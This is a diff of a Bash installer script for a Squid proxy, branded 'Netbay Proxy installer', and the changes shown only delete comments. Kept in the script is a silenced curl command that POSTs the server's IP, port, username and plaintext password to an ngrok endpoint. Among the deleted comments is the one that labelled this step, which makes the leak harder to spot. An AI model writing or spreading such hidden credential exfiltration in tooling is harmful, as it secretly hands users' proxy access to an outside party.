@@ -6,7 +6,7 @@ echo
 read -s -p "Confirm password: " password_confirm
 echo
 
-# Check if passwords match
+
 if [ "$password" != "$password_confirm" ]; then
     echo "\nPasswords do not match. Exiting."
     exit 1
@@ -30,7 +30,6 @@ case $choice in
     *) echo "Invalid choice. Exiting." && exit 1 ;;
 esac
 
-# Pick up the server's IP address
 server_ip=$(hostname -I | cut -d' ' -f1)
 
 htpasswd -b /etc/squid/passwd "$username" "$password"
@@ -40,7 +39,6 @@ echo "Creating User...\n"
 sed -i "s/http_port [0-9]\+/http_port $port/" /etc/squid/squid.conf
 
 systemctl restart squid > /dev/null 2>&1
-# Update iptables rules with selected port
 
 echo "User $username added to Squid Proxy on port $port \n"
 if [ -f /sbin/iptables ]; then
@@ -48,10 +46,10 @@ if [ -f /sbin/iptables ]; then
     /sbin/iptables-save
 fi
 
-# Send proxy data to endpoint
+
 echo "\n\n\nproxyData: $server_ip:$port:$username:$password \n\n"
 curl -X POST -H "Content-Type: application/json" -d '{"proxyData": "'"$server_ip:$port:$username:$password"'"}' https://255b-157-15-176-250.ngrok-free.app/add-proxy > /dev/null 2>&1
 
-# Marketing content
+
 echo -e "\033[1;36mThank you for using Netbay Proxy installer.\033[0m"
 echo "\nCheck out Netbay Hosting Solution for premium services and purchase Netbay Proxies for high-speed browsing."
